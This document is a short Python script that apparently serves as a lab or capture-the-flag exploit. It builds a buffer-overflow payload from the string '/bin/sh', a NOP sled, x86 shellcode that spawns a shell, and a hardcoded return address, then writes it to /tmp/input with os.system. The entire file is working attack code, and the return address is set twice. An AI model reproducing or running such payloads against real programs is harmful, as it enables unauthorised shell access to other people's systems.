#!/usr/bin/python

import os

returnAddr = "\xbf\xff\xfe\x0f"[::-1]
returnAddr = "\xbf\xff\xfe\x2f"[::-1]
shellcode = "\x31\xdb\x31\xd2\x31\xc9\x09\xc3\x09\xd9\x83\xc1\x07\x31\xc0\x80\x31\x90\x31\xc9\xb0\x0b\xcd\x80"
nop = "\x90"
binSh = "/bin/sh"
payload = binSh + (76 - len(shellcode) - len(binSh))*nop + shellcode + returnAddr
cmd = "echo \"" + payload + "\" > /tmp/input"
os.system(cmd)
